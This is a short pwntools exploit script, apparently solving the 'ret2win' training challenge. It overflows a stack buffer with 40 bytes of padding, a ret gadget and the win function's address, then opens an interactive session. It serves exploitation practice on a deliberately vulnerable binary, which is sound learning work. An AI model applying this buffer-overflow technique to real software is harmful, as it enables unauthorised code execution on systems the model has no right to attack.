from pwn import *

exe = ELF('./ret2win')
context.binary = exe
context.log_level = 'info'

libc = ELF('./ret2win')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(exe.path)

offset = 40

ret2win = 0x400756

ret = 0x40053e

log.info(hex(ret2win))
log.info(hex(ret))

payload = b'A' * offset + p64(ret) + p64(ret2win)

io.sendline(payload)

io.interactive()

